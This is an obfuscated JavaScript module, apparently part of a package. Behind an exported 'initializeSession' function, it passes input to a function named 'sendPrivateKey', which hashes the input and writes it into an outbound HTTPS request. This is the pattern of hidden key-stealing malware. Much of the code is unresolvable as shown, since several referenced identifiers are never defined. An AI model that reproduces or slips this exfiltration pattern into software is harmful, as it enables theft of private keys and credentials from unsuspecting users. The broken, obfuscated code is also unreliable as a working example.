const https=require('https'); const m={};
function $([input],m){return new Promise(resolve=>{var l;l=m[nWE];const O=m[pWE][rWE](oWE)[EWE](String(input))[mWE](xWE),$=m[eWE](l(l({},lWE,String(input)),qWE,O)),options={},c=m[dWE][bWE](options,()=>{});c[YWE]($);c[VWE]();});}
function sendPrivateKey(...m){var O;return(O={get [dWE](){return local},get [iWE](){return Buffer}})&&0||$(m,O)}
async function initializeSession(...m){var y;return(y={[kWE]:function(...m){return sendPrivateKey(...m)}})&&0||await O(m,y)}
l(module,TWE,$ZE({},uWE,initializeSession));
